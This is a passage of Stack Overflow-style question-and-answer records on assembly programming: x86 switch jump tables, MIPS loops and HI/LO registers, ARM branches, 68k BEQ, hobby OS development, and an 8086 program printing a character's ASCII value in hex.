  <p>Switch statement: 5261 ms<br>
  If     statement: 5196 ms</p>
</blockquote>

<p>From what I've learned, <code>switch</code> statements apparently use jump tables to optimize the branching.</p>

<h2>Questions:</h2>

<ol>
<li><p>What would a basic jump table look like, in x86 or x64?</p></li>
<li><p>Is this code using a jump table?</p></li>
<li><p>Why is there no performance difference in this example? Is there any situation in which there <em>is</em> a significant performance difference?</p></li>
</ol>

<hr>

<p>Disassembly of the code:</p>

<pre><code>testIf:

13FE81B10 sub  rsp,48h 
13FE81B14 call qword ptr [__imp_clock (13FE81128h)] 
13FE81B1A mov  dword ptr [start],eax 
13FE81B1E mov  qword ptr [i],0 
13FE81B27 jmp  testIf+26h (13FE81B36h) 
13FE81B29 mov  rax,qword ptr [i] 
13FE81B2E inc  rax  
13FE81B31 mov  qword ptr [i],rax 
13FE81B36 cmp  qword ptr [i],20000000h 
13FE81B3F jae  testIf+0C3h (13FE81BD3h) 
13FE81B45 xor  edx,edx 
13FE81B47 mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81B4E mov  ecx,4 
13FE81B53 div  rax,rcx 
13FE81B56 mov  rax,rdx 
13FE81B59 inc  rax  
13FE81B5C mov  qword ptr [c],rax 
13FE81B61 cmp  qword ptr [c],1 
13FE81B67 jne  testIf+6Dh (13FE81B7Dh) 
13FE81B69 mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81B70 add  rax,4 
13FE81B74 mov  qword ptr [counter (13FE835D0h)],rax 
13FE81B7B jmp  testIf+0BEh (13FE81BCEh) 
13FE81B7D cmp  qword ptr [c],2 
13FE81B83 jne  testIf+89h (13FE81B99h) 
13FE81B85 mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81B8C add  rax,3 
13FE81B90 mov  qword ptr [counter (13FE835D0h)],rax 
13FE81B97 jmp  testIf+0BEh (13FE81BCEh) 
13FE81B99 cmp  qword ptr [c],3 
13FE81B9F jne  testIf+0A5h (13FE81BB5h) 
13FE81BA1 mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81BA8 add  rax,2 
13FE81BAC mov  qword ptr [counter (13FE835D0h)],rax 
13FE81BB3 jmp  testIf+0BEh (13FE81BCEh) 
13FE81BB5 cmp  qword ptr [c],4 
13FE81BBB jne  testIf+0BEh (13FE81BCEh) 
13FE81BBD mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81BC4 inc  rax  
13FE81BC7 mov  qword ptr [counter (13FE835D0h)],rax 
13FE81BCE jmp  testIf+19h (13FE81B29h) 
13FE81BD3 call qword ptr [__imp_clock (13FE81128h)] 
13FE81BD9 sub  eax,dword ptr [start] 
13FE81BDD imul eax,eax,3E8h 
13FE81BE3 cdq       
13FE81BE4 mov  ecx,3E8h 
13FE81BE9 idiv eax,ecx 
13FE81BEB cdqe      
13FE81BED add  rsp,48h 
13FE81BF1 ret       
</code></pre>

<hr>

<pre><code>testSwitch:

13FE81C00 sub  rsp,48h 
13FE81C04 call qword ptr [__imp_clock (13FE81128h)] 
13FE81C0A mov  dword ptr [start],eax 
13FE81C0E mov  qword ptr [i],0 
13FE81C17 jmp  testSwitch+26h (13FE81C26h) 
13FE81C19 mov  rax,qword ptr [i] 
13FE81C1E inc  rax  
13FE81C21 mov  qword ptr [i],rax 
13FE81C26 cmp  qword ptr [i],20000000h 
13FE81C2F jae  testSwitch+0C5h (13FE81CC5h) 
13FE81C35 xor  edx,edx 
13FE81C37 mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81C3E mov  ecx,4 
13FE81C43 div  rax,rcx 
13FE81C46 mov  rax,rdx 
13FE81C49 inc  rax  
13FE81C4C mov  qword ptr [rsp+30h],rax 
13FE81C51 cmp  qword ptr [rsp+30h],1 
13FE81C57 je   testSwitch+73h (13FE81C73h) 
13FE81C59 cmp  qword ptr [rsp+30h],2 
13FE81C5F je   testSwitch+87h (13FE81C87h) 
13FE81C61 cmp  qword ptr [rsp+30h],3 
13FE81C67 je   testSwitch+9Bh (13FE81C9Bh) 
13FE81C69 cmp  qword ptr [rsp+30h],4 
13FE81C6F je   testSwitch+0AFh (13FE81CAFh) 
13FE81C71 jmp  testSwitch+0C0h (13FE81CC0h) 
13FE81C73 mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81C7A add  rax,4 
13FE81C7E mov  qword ptr [counter (13FE835D0h)],rax 
13FE81C85 jmp  testSwitch+0C0h (13FE81CC0h) 
13FE81C87 mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81C8E add  rax,3 
13FE81C92 mov  qword ptr [counter (13FE835D0h)],rax 
13FE81C99 jmp  testSwitch+0C0h (13FE81CC0h) 
13FE81C9B mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81CA2 add  rax,2 
13FE81CA6 mov  qword ptr [counter (13FE835D0h)],rax 
13FE81CAD jmp  testSwitch+0C0h (13FE81CC0h) 
13FE81CAF mov  rax,qword ptr [counter (13FE835D0h)] 
13FE81CB6 inc  rax  
13FE81CB9 mov  qword ptr [counter (13FE835D0h)],rax 
13FE81CC0 jmp  testSwitch+19h (13FE81C19h) 
13FE81CC5 call qword ptr [__imp_clock (13FE81128h)] 
13FE81CCB sub  eax,dword ptr [start] 
13FE81CCF imul eax,eax,3E8h 
13FE81CD5 cdq       
13FE81CD6 mov  ecx,3E8h 
13FE81CDB idiv eax,ecx 
13FE81CDD cdqe      
13FE81CDF add  rsp,48h 
13FE81CE3 ret       
</code></pre>

<hr>

<h3>Update:</h3>

<p>Interesting results <a href=""https://www.ideone.com/jA90s"">here</a> and <a href=""https://www.ideone.com/Zpp6s"">here</a>. Not sure why one is faster and one is slower, though.</p>
","<p>There are several optimizations a compiler <em>can</em> make on a switch. I don't think the oft-mentioned ""jump-table"" is a very useful one though, as it only works when the input can be bounded some way.</p>

<p>C Pseudocode for a ""jump table"" would be something like <a href=""http://en.wikipedia.org/wiki/Branch_table#Jump_table_example_in_C"">this</a> -- note that the compiler in practice would need to insert some form of if test around the table to ensure that the input was valid in the table. Note also that it only works in the specific case that the input is a run of consecutive numbers.</p>

<p>If the number of branches in a switch is extremely large, a compiler can do things like using binary search on the values of the switch, which (in my mind) would be a much more useful optimization, as it does significantly increase performance in some scenarios, is as general as a switch is, and does not result in greater generated code size. But to see that, your test code would need a LOT more branches to see any difference.</p>

<p>To answer your specific questions:</p>

<ol>
<li><p>Clang generates one that looks like <a href=""http://gcc.godbolt.org/#%7B%22version%22%3A3%2C%22filterAsm%22%3A%7B%22labels%22%3Atrue%2C%22directives%22%3Atrue%2C%22commentOnly%22%3Atrue%7D%2C%22compilers%22%3A%5B%7B%22sourcez%22%3A%22C4UwtgDgNghqA8BXAdgZwJYHNkgCYD4AoANwHt1cACAYxiigAoBKAbkJPKtFWAH1UA7umDUAFgzEwATjSaUA3oQCQg4WMoS5ipbVQhKABgBcynXSjwD%2BZmyVKARlJAwA1rd36AjCbu168T2tWU0dnN2UPSgAmHzN%2FKKDbBydXdxg9SgBmWL8LTMSQlPCzDIAWHPN4UoK7UNSI9P0AVgr%2FJprksLSMgDZWix6OuuLIgHZ%2B%2BFGhou79AA4JuemuhoyATgm15fqSr2NTXICrG0KV3cpPbwPKy%2B2RxouY6%2F9PBJPamdWvbOeLT3z3p0dpFPOVfgFqoDhrMLi1wZ52lDPudPH14YMkWcQeN4VNMcCHp4FvClvj7hlPBt4VsybYAL6EBkcCiUbh8dAAMwkomksgUyk5GmolAAvCLDFpwcdgko6ZQQFAMoKJKLxZ5Jb4bjU5QqlRyharohq4hY3jKdYr9MrhWKssbDgDzfLLZRrYbSvbKpCnbqrfqVbamp62trnXqDbaesGBqHfa7%2FTbxaNo5NYy63ba5inST70wnDWsUzTc%2BGA2qDCnPNL6WG%2FRG1er%2BZqXoF3hbS4nHpWzTW4xm1ZlK47e3n6xcPU2TRC0x3DQjK4iS3Wyxco5PDqiZ8vO55k%2Bubnil%2FGx0TKzmR7PbZTK8X6YzCEAAA%3D%22%2C%22compiler%22%3A%22clang371%22%2C%22options%22%3A%22%20-std%3Dc%2B%2B14%20-O3%20-Wall%20-Wextra%22%7D%5D%7D"">this</a>:</p>

<pre><code>test_switch(char):                       # @test_switch(char)
        movl    %edi, %eax
        cmpl    $19, %edi
        jbe     .LBB0_1
        retq
.LBB0_1:
        jmpq    *.LJTI0_0(,%rax,8)
        jmp     void call&lt;0u&gt;()         # TAILCALL
        jmp     void call&lt;1u&gt;()         # TAILCALL
        jmp     void call&lt;2u&gt;()         # TAILCALL
        jmp     void call&lt;3u&gt;()         # TAILCALL
        jmp     void call&lt;4u&gt;()         # TAILCALL
        jmp     void call&lt;5u&gt;()         # TAILCALL
        jmp     void call&lt;6u&gt;()         # TAILCALL
        jmp     void call&lt;7u&gt;()         # TAILCALL
        jmp     void call&lt;8u&gt;()         # TAILCALL
        jmp     void call&lt;9u&gt;()         # TAILCALL
        jmp     void call&lt;10u&gt;()        # TAILCALL
        jmp     void call&lt;11u&gt;()        # TAILCALL
        jmp     void call&lt;12u&gt;()        # TAILCALL
        jmp     void call&lt;13u&gt;()        # TAILCALL
        jmp     void call&lt;14u&gt;()        # TAILCALL
        jmp     void call&lt;15u&gt;()        # TAILCALL
        jmp     void call&lt;16u&gt;()        # TAILCALL
        jmp     void call&lt;17u&gt;()        # TAILCALL
        jmp     void call&lt;18u&gt;()        # TAILCALL
        jmp     void call&lt;19u&gt;()        # TAILCALL
.LJTI0_0:
        .quad   .LBB0_2
        .quad   .LBB0_3
        .quad   .LBB0_4
        .quad   .LBB0_5
        .quad   .LBB0_6
        .quad   .LBB0_7
        .quad   .LBB0_8
        .quad   .LBB0_9
        .quad   .LBB0_10
        .quad   .LBB0_11
        .quad   .LBB0_12
        .quad   .LBB0_13
        .quad   .LBB0_14
        .quad   .LBB0_15
        .quad   .LBB0_16
        .quad   .LBB0_17
        .quad   .LBB0_18
        .quad   .LBB0_19
        .quad   .LBB0_20
        .quad   .LBB0_21
</code></pre></li>
<li><p>I can say that it is not using a jump table -- 4 comparison instructions are clearly visible:</p>

<pre><code>13FE81C51 cmp  qword ptr [rsp+30h],1 
13FE81C57 je   testSwitch+73h (13FE81C73h) 
13FE81C59 cmp  qword ptr [rsp+30h],2 
13FE81C5F je   testSwitch+87h (13FE81C87h) 
13FE81C61 cmp  qword ptr [rsp+30h],3 
13FE81C67 je   testSwitch+9Bh (13FE81C9Bh) 
13FE81C69 cmp  qword ptr [rsp+30h],4 
13FE81C6F je   testSwitch+0AFh (13FE81CAFh) 
</code></pre>

<p>A jump table based solution does not use comparison at all.</p></li>
<li>Either not enough branches to cause the compiler to generate a jump table, or your compiler simply doesn't generate them. I'm not sure which.</li>
</ol>

<p><strong>EDIT 2014</strong>: There has been some discussion elsewhere from people familiar with the LLVM optimizer saying that the jump table optimization can be important in many scenarios; e.g. in cases where there is an enumeration with many values and many cases against values in said enumeration. That said, I stand by what I said above in 2011 -- too often I see people thinking ""if I make it a switch, it'll be the same time no matter how many cases I have"" -- and that's completely false. Even with a jump table you get the indirect jump cost and you pay for entries in the table for each case; and memory bandwidth is a Big Deal on modern hardware.</p>

<p>Write code for readability. <a href=""http://gcc.godbolt.org/#%7B%22version%22%3A3%2C%22filterAsm%22%3A%7B%22labels%22%3Atrue%2C%22directives%22%3Atrue%2C%22commentOnly%22%3Atrue%7D%2C%22compilers%22%3A%5B%7B%22sourcez%22%3A%22C4UwtgDgNghqA8BXAdgZwJYHNkgCYD4AoANwHt1cACAYxiigAoBKAbkJPKtFWAH1UA7umDUAFgzEwATjSaUA3oQCQg4WMoS5ipbVQhKABgBcynXSjwD%2BZmyVKARlJAwA1rd36AjCbu168T2tWU0dnN2UPSgAmHzN%2FKKDbBydXdxg9SgBmWL8LTMSQlPCzDIAWHPN4UoK7UNSI9P0AVgr%2FJprksLSMgDZWix6OuuLIgHZ%2B%2BFGhou79AA4JuemuhoyATgm15fqSr2NTXICrG0KV3cpPbwPKy%2B2RxouY6%2F9PBJPamdWvbOeLT3z3p0dpFPOVfgFqoDhrMLi1wZ52lDPudPH14YMkWcQeN4VNMcCHp4FvClvj7hlPBt4VsybYAL6EBkcCiUbh8dAAMwkomksgUyk5GmolAAvCLDFpwcdgko6ZQQFAMoKJKLxZ5Jb4bjU5QqlRyharohq4hY3jKdYr9MrhWKssbDgDzfLLZRrYbSvbKpCnbqrfqVbamp62trnXqDbaesGBqHfa7%2FTbxaNo5NYy63ba5inST70wnDWsUzTc%2BGA2qDCnPNL6WG%2FRG1er%2BZqXoF3hbS4nHpWzTW4xm1ZlK47e3n6xcPU2TRC0x3DQjK4iS3Wyxco5PDqiZ8vO55k%2Bubnil%2FGx0TKzmR7PbZTK8X6YzCEAAA%3D%22%2C%22compiler%22%3A%22clang371%22%2C%22options%22%3A%22%20-std%3Dc%2B%2B14%20-O3%20-Wall%20-Wextra%22%7D%5D%7D"">Any compiler worth its salt is going to see an if / else if ladder and transform it into equivalent switch or vice versa if it would be faster to do so.</a></p>
","6805054"
"Find which assembly instruction caused an Illegal Instruction error without debugging","40385","","<p>While running a program I've written in assembly, I get <code>Illegal instruction</code> error. Is there a way to know which instruction is causing the error, without debugging that is, because the machine I'm running on does not have a debugger or any developement system. In other words, I compile in one machine and run on another. I cannot test my program on the machine I'm compiling because they don't support SSE4.2. The machine I'm running the program on does support SSE4.2 instructions nevertheless.</p>

<p>I think it maybe because I need to tell the assembler (YASM) to recognize the SSE4.2 instructions, just like we do with gcc by passing it the <code>-msse4.2</code> flag. Or do you think its not the reason? Any idea how to tell YASM to recognize SSE4.2 instructions?</p>

<p>Maybe I should trap the <a href=""http://en.wikipedia.org/wiki/SIGILL"" rel=""noreferrer"">SIGILL</a> signal and then decode the SA_SIGINFO to see what kind of illegal operation the program does.</p>
","<p>Actually often you get an illegal instruction error not because your program contain an illegal opcode but because there is a bug in your program (e.g., a buffer overflow)  that makes your program jumps in a random address with plain data or in code but not in the start of the opcode.</p>
","10354227"
"Learning assembly","39946","","<p>I decided to learn Assembly language. The main reason to do so is being able to understand disassembled code and maybe being able to write more efficient parts of code (for example, through c++), doing somethings like code caves, etc. I saw there are a zillion different flavors of assembly, so, for the purposes I mention, how should I start? What kind of assembly should I learn? I want to learn by first doing some easy programs (i.e. a calculator), but the goal itself will be to get accostumed with it so I can understand the code shown, for example, by IDA Pro.</p>

<p>I'm using windows (if that makes any difference).</p>

<p>edit: So, seems everyone is pointing towards MASM. Although I get the point that it has high level capabilities, all good for the assembly code programmer, that's not what I'm looking for. It seems to have if, invoke, etc instructions not shown in popular deassemblers (like IDA). So what I'd like to hear if possible, is the opinion of anyone that uses ASM for the purposes I am asking (reading deassembled exe's code in IDA), not just ""general"" assembly programmers.</p>

<p>edit: OK. I am already learning assembly. I am learning MASM, not using the high level stuff that doesn't matter to me. What I'm doing right now is trying out my code on __asm directives in c++, so I can try out things way faster than if I  had to do everything from scratch with MASM.</p>
","<p>Start with <a href=""http://www.masm32.com/"" rel=""nofollow noreferrer"">MASM32</a> and from there look at <a href=""http://flatassembler.net/"" rel=""nofollow noreferrer"">FASM</a>. But you'll have fun with MASM.</p>
","1360288"
"How can I build a small operating system on an old desktop computer?","39616","","<p>This might be in vain, as I know writing an operating system is unbearably complicated (especially by oneself).</p>

<ul>
<li><p>I don't expect to build the next linux, or windows.</p></li>
<li><p>I know it will be horrible, and buggy, and won't work, but that's fine.</p></li>
</ul>

<p>I want to write everything myself, in <em>Assembly</em>, <em>C</em>, and (some) <em>C++</em>.</p>

<p>This is a future project, as I'm busy with some other things at the moment and don't have the time immediately, but I figured I would ask it now, so maybe I could get lots of answers to this, and it could build up and be a useful resource for this kind of approach (everything else I have seen involved building off of minix, using an existing bootloader, building it in a virtual booting program thing, etc).</p>

<p>I want to set up one of my older desktops with a monitor, keyboard and mouse, and start working on a <em>blank</em> hard drive.</p>

<p>I want to learn how to write my own bootloader (I've found lots of resources about this, but for completeness, please still add some good ones), my own USB driver (if that's necessary), a CD driver (if that's necessary), etc. Everything, from the ground up.</p>

<ul>
<li><p>How do I put the code onto the computer? Is it best to do it with a floppy disk? Can most computers do it from a USB stick?</p></li>
<li><p>What drivers do I need, and can you suggest any references to building those?</p></li>
<li><p>After the booting sequence--then what? How do I get into protected mode etc.</p></li>
<li><p>How do I manage memory without the help of an operating system? Do I just use whatever addresses I want? No initialization necessary?</p></li>
<li><p>What will I undoubtedly run into that will confuse me?</p></li>
<li><p>How can I make it either a command line O/S, and a graphical one?</p></li>
<li><p>What is a graphical O/S built on? Like, how would I do something like, a command line, with a font, and a picture at the top?</p></li>
<li><p>Where can I read about setting up a multitasking environment? (ie., having two graphical-like command lines running side-by-side).</p></li>
<li><p>How would I set up a sort of windowing system? How do I display graphics on the screen once simple multitasking is set up?</p></li>
</ul>

<p>Believe me, I understand that this is a <em>very</em> complicated project, and I probably will never get around to completing it or writing anything on it of any use.</p>

<p>There are lots of other pieces to this I haven't mentioned, if you think of any, feel free to add those too.</p>

<p>Please put one ""topic"" per answer--for example, USB drivers, and then maybe a list of resources, things to look out for, etc.</p>

<p>Also, please don't suggest building off of another O/S or pre-existing code. I know I will <em>read</em> a lot of pre-existing code (such as the linux kernel, or example resources, existing drivers, etc) but ultimately I want to do all the writing myself. I know I <em>should</em> build off of something else, and there are lots of other questions on SO about that that I can read if I change my mind and go that route. But this one is all about doing the whole thing from scratch.</p>

<h2>update</h2>

<p>I've got lots of great answers to this, mostly about the booting process, file systems and various existing projects to read for reference.</p>

<p>Any suggestions on how to get it graphical? Different video modes and how to work with them, etc?</p>
","<p>First things first. Read, read, read, read, read. You need to have a firm understanding of how the OS works before you can hope to implement your own.</p>

<p>Grab one of Andrew Tanenbaum's books on operating systems. This is the one we used in my OS class in college:</p>

<p><a href=""http://ecx.images-amazon.com/images/I/51DptFJH9NL._SL500_AA240_.jpg"" rel=""noreferrer"">Modern Operating Systems http://ecx.images-amazon.com/images/I/51DptFJH9NL._SL500_AA240_.jpg</a></p>

<p><a href=""http://rads.stackoverflow.com/amzn/click/0136006639"" rel=""noreferrer"">Modern Operating Systems on Amazon</a></p>

<p>Despite the ridiculous cover, it's a fantastic read, especially for a textbook. Tanenbaum is really an expert in this area and his explanations of how the OS works underneath the hood are clear and easy to understand. This book is mostly theory, but I believe he also has a book that discusses more of the implementation. I've never read it, though, so I can't comment on it.</p>

<p>That should help you bone up on process management, memory management, filesystems, and everything else your OS kernel needs to do to get it up to a bootable state. From that point on it's basically a matter of writing device drivers for the hardware you need to support, and offering implementations of the C library functions to make kernel calls for things like opening files and devices, reading and writing, passing messages between processes, etc.</p>

<p>Read up on x86 assembly (assuming you are designing this for an x86 machine). That should answer  a lot of your questions with regards to moving between processor operating modes.</p>

<p>If you've got any electronics knowledge, it may be easier to start with writing an operating system for an embedded device that has ample documentation, because it will generally be simpler than an x86 PC. I've always wanted to write my own OS as well, and I'm starting with writing a microkernel embedded OS for <a href=""http://www.digilentinc.com/Products/Detail.cfm?NavPath=2,400,451&amp;Prod=NEXYS2"" rel=""noreferrer"">this development board</a> from Digilent. It can run the soft-core MicroBlaze processor from Xilinx, which has very thorough documentation. It's also got some RAM, flash data storage, LEDs, switches, buttons, VGA output, etc. Plenty of stuff to play around with writing simple drivers for.</p>

<p>One of the benefits of an embedded device is also that you may be able to avoid writing a VGA driver for a long time. In my case, the Digilent development board has an onboard UART, so I can effectively use the serial output as my console to get the whole thing up and booting to a command line with minimal fuss.</p>

<p>Just make sure that whatever you choose to target has a readily available and well-tested compiler for it. You do <strong>not</strong> want to be writing an OS and a compiler at the same time.</p>
","1224884"
"MIPS assembly for a simple for loop","39399","","<p>I need to translate this C code to MIPS assembly.
Here is the C code:</p>

<pre><code>int tmp = 0; 
for (int  j = 0; j &lt; 15; ++j) 
     tmp = tmp * 2 + 3
</code></pre>

<p>This is my MIPS assembly code. Is it a correct translation? If you see any mistakes I would really like to know.</p>

<pre><code># tmp = $v0
# j = $t0

.globl main

 main:
    li $v0,0

loop:
    bgt $t0,15,exit
    addi $t0,$t0,1
    mul $t1,$v0,2
    add $v0,$t1, 3
    j loop  

exit:
</code></pre>
","<p>Your loop goes from 0 to 14, so your bgt instruction should be: <code>bgt $t0,14,exit</code> I think.</p>

<p>.</p>
","9155379"
"In MIPS, what is HI and LO","39074","","<p>I'm reading about division in MIPS and I've found that div</p>

<blockquote>
  <p>Divides $s by $t and stores the
  quotient in $LO and the remainder in
  $HI</p>
</blockquote>

<p><a href=""http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html"" rel=""noreferrer"">http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html</a></p>

<p>And Wikipedia says </p>

<blockquote>
  <p>HI and LO are used to access the multiplier/divider results, accessed by the mfhi (move from high) and mflo commands.</p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/MIPS_architecture"" rel=""noreferrer"">http://en.wikipedia.org/wiki/MIPS_architecture</a></p>

<p>Are HI and LO registers?  What number registers are they?</p>
","<p>These are <em>special registers</em> used to store the result of multiplication and division. They are not directly addressable. Their contents are accessed with special instructions <code>mfhi</code> and <code>mflo</code> </p>

<p>They are present in the Multiply Unit and are 32-bits each. More info <a href=""http://chortle.ccsu.edu/AssemblyTutorial/Chapter-14/ass14_3.html"" rel=""nofollow noreferrer"">here</a>.</p>
","2320233"
"ARM Assembler - How do I use CMP, BLT and BGT?","39000","","<p>Quick question for you guys, in my loop I need to use CMP , BLT and BGT to compare some values. How would use said instructions in the following loop?</p>

<p>I'm trying to use BGT , BLT and CMP as I need them to make my application work. The trouble is I have no idea how to use them. If I wanted to use CMP to compare r6, with r4 and put the difference into r7, how would I do this? The same question if I wanted to use BLT if r7 is less than 0, how would I do this?</p>

<pre><code>  BGT ??????? ; branch if greater than 5
  CMP ???????? ; compare r6 with r4 , put difference into r7
  BLT ???????? ;branch if r7 is less than 0
  BGT ???????? ;branch if r7 is greater than 0
</code></pre>

<p>Here's my entire loop:</p>

<pre><code>LoopStart

  BL WaitBUT1
  BL readTemp
  BL checkTemp
  BGT ??????? ; branch if greater than 5
  BL errorVal
  CMP ???????? ; compare r6 with r4 , put difference into r7
  BLT ???????? ;branch if r7 is less than 0
  BL FanOn
  BL errorLedOn
  BL systemLedOn
  BL heaterOn
  BGT ???????? ;branch if r7 is greater than 0
  BL FanOff
  BL errorLedOff
  BL systemLedOff
  BL heaterOff
  BL WaitBUT2
  BL FanOff
  BL errorLedOff
  BL systemLedOff
  BL heaterOff

  B LoopStart
</code></pre>
","<p>You cannot do a conditional branch without first setting the condition register somehow. This can be done with <code>cmp</code> or by adding <code>s</code> to most instructions. Check out the ARM assembly documentation for details. Quick example:</p>

<p>Branch if <code>r0</code> greater than 5:<br></p>

<pre><code>cmp r0, #5 ;Performs r0-5 and sets condition register
bgt label_foo ;Branches to label_foo if condition register is set to GT
</code></pre>

<p>Compare <code>r6</code> with <code>r4</code> , put difference into <code>r7</code>, branch if <code>r7 &lt; 0</code>:<br></p>

<pre><code>subs r7, r6, r4 ;Performs r7 = r6 - r4 and sets condition register
blt label_bar ;Branches to label_bar if r7 &lt; 0 (in which case r6 &lt; r4)
</code></pre>
","10601851"
"What does the BEQ instruction do exactly?","38761","","<p>I have the following assembly code snippet I am trying to understand. It is assembly for a MC68332 microcontroller.</p>

<pre><code>LOOP
    some instructions
    some more instructions
BEQ LOOP
</code></pre>

<p>I've googled BEQ and I have found it means branch on result zero, but I still don't really understand what it does. Does it compare the result of the last instruction to 0, and if it is 0, it goes back to the LOOP line?</p>
","<p>On Motorola 68k family it stands for ""branch if equal"" which means ""jump to given address if zero flag is set"" (like when previous comparison was successful).</p>

<p>However 68332 seems to differ from that and based on ""uppercase syntax"" it could be a macro wrapper around another instruction which essentially does the same thing. </p>

<p>Assembly programmers who port code from other systems can make use of similar macros to ease the porting process.</p>
","9152795"
"A good NASM/FASM tutorial?","38196","","<p>Does anyone know any good <a href=""http://www.nasm.us/"" rel=""noreferrer"">NASM</a> or FASM tutorials? I am trying to learn assembler but I can't seem to find any good resources on it.</p>
","<p>There is e.g. <a href=""http://leto.net/writing/nasm.php"" rel=""noreferrer"">Writing A Useful Program With NASM </a> and of course the obvious <a href=""http://www.nasm.us/doc/nasmdoc3.html"" rel=""noreferrer"">http://www.nasm.us/doc/nasmdoc3.html</a>.</p>

<p>There are a couple of sample programs at <a href=""http://www.csee.umbc.edu/help/nasm/sample.shtml"" rel=""noreferrer"">http://www.csee.umbc.edu/help/nasm/sample.shtml</a></p>

<p>If you are looking for a more general introduction to assembly programming there is <a href=""http://homepage.mac.com/randyhyde/webster.cs.ucr.edu/index.html"" rel=""noreferrer"">The Art of Assembly Programming</a> and the wikipedia page on NASM references <a href=""http://rads.stackoverflow.com/amzn/click/0471375233"" rel=""noreferrer"">Assembly Language Step by Step</a> by Jeff Duntemann.</p>
","1947135"
"8086 Assembly (TASM): Displaying an ASCII character value as HEX","37386","","<p>** Edited for clarification and ""cleaner"" code.</p>

<p>I'm trying to accept a character from the keyboard (any character) and convert it's ASCII value to hex, then display it.  </p>

<p>I know how to convert from base 10 to hex, but just to make sure I'm not using incorrect terminology:</p>

<p>If I enter ""c"" in as my ASCII value, it's decimal value is 63.  63 divided by 16 (hex is base 16) = 3.9375.  Save the quotient of 3 for later.  Remainder * base (.9375 * 16) = 15.  15 is Hex character ""F"".  </p>

<p>Quotient divided by base (3 / 16) = 0.1875.  Quotient is zero, so this is the last step in conversion.  Remainder * base (.1875 * 16) = 3</p>

<p>Read them from last to first (""first in, last out"", if thinking about the stack), and I get ""3F"" as the Hex value for the decimal number ""63"" (which is ASCII for ""c"")</p>

<p>This is correct, yes?</p>

<p>It's pretty simple to read, I hope.  I just get the character from the keyboard (AL), set BX as the divisor (base 16), and then divide AL by BX, store the remainder in the stack, and later on loop through the stack and try to display it...</p>

<p>I think my problem is that something is wrong with my multiplication and with my INT 21H/02H.  I'm not sure if I need to add 30h in order to display the character or not...</p>

<p>On top of that, I'm not even sure if I need to be at that point (displaying) yet anyway, because I still haven't figured out how to convert 10-15 to A-F for hex.  </p>

<p>I tried speaking with my teacher, and after waiting 30 minutes for him to finish speaking to another gaggle of students in my class (about something from another one of his classes, and not this one...which irked me quite a bit), the most that I got was ""start over"".  </p>

<p>When asked about ""what about using SHR and SHL?"" as it was pointed out to me, but I was told that it can be done without that, and that I can't use those commands (they haven't been covered in the class).</p>

<p>Any input on what I'm doing wrong?  Thanks!</p>

<pre><code>    CHAR2HEX PROC                   ; Accept a character, print it's ascii value in hex.

        MOV DX, OFFSET AskChar      ; Display prompt
        MOV AH, 09H
        INT 21H

        MOV AX, 0                   ; Clear AX

        MOV AH, 07H                 ; Get keyboard input w/ no echo (AL)
        INT 21H

        MOV BX, 16                  ; Set up the divisor (base 16)
        MOV CX, 0                   ; Initialize the counter
        MOV DX, 0                   ; Clear DX

        Divide:                         
                                    ; Dividend (what's being divided) in DX/AX pair, Quotient in AX, Remainder in DX.
            DIV BX                  ; Divide (will be word sized).
            PUSH AX                 ; Save DX (the remainder) to stack.

            ADD CX, 1               ; Add one to counter

            MOV DX, 0               ; Clear Remainder (DX)
            CMP AX, 0               ; Compare Quotient (AX) to zero
            JNE Divide              ; If AX not 0, go to ""Divide:""

        Multiply:
                                    ; Multiply remainder (from stack) by 16 to get hex value.               
            MOV DX, 0               ; Clear DX           
            POP AX                  ; Get remainder from stack into AX.

            MUL BX                  ; Multiply AX * BX.  (DX= high order bits, AX = low order bits)
            MOV DX, AX

            SUB DL, 30h             ; ADD 30h to DL 
            MOV AH, 02h             ; 02h to display AH (DL)
            INT 21H                 ; Send to DOS

            LOOP Multiply           ; If more to do, Multiply again
                                    ; LOOP subtracts 1 from CX. If non-zero, loop.
            RET
    CHAR2HEX ENDP
END START
</code></pre>

<p><em><strong></em> EDITED **</strong></p>

<p>I finally got it!  I was able to get the program to return the hex value of the ascii char that was pushed on the keyboard, but it only worked if each remainder was 0 through 9.  It wouldn't display the A through F, and instead used colons, semicolons, etc...</p>

<p>I looked at an Ascii/Deicmal/Hex chart online, and noticed that the characters 0 through 9 are 30h through 39h.  But character A (for hex 10) doesn't start until 40h.  So I changed the program so that if the value was greater than 39h, it added 7h to DL and THEN display it.  </p>

<pre><code>    CHAR2HEX PROC                   ; Accept a character, print it's ascii value in hex.

        MOV DX, OFFSET AskChar      ; Display prompt
        MOV AH, 09H
        INT 21H

        MOV AH, 07H                 ; Get keyboard input w/ no echo (AL)
        INT 21H

        MOV CL, AL                  ; Copy user input (AL) to CL
        MOV AX, 0                   ; Clear AX (get rid of HO bits)
        MOV AL, CL                  ; Copy user input back into AL

        MOV BX, 16                  ; Set up the divisor (base 16)
        MOV CX, 0                   ; Initialize the counter
        MOV DX, 0                   ; Clear DX

        Div2:                         
                                    ; Dividend (what's being divided) in DX/AX pair, Quotient in AX, Remainder in DX.
            DIV BX                  ; Divide (will be word sized).
            PUSH DX                 ; Save DX (the remainder) to stack.

            ADD CX, 1               ; Add one to counter
            MOV DX, 0               ; Clear Remainder (DX)
            CMP AX, 0               ; Compare Quotient (AX) to zero
            JNE Div2              ; If AX not 0, go to ""Div2:""

        getHex2:
            MOV DX, 0               ; Clear DX.
            POP DX                  ; Put top of stack into DX.
            ADD DL, 30h             ; Conv to character.

            CMP DL, 39h
            JG MoreHex2

        HexRet2:        

            MOV AH, 02h             ; 02h to display AH (DL)
            INT 21H                 ; Send to DOS

            LOOP getHex2            ; If more to do, getHex2 again
                                    ; LOOP subtracts 1 from CX. If non-zero, loop.
            JMP Skip2
        MoreHex2:
            ADD DL, 7h
            JMP HexRet2             ; Return to where it left off before adding 7h.
        Skip2:
            RET
    CHAR2HEX ENDP
</code></pre>
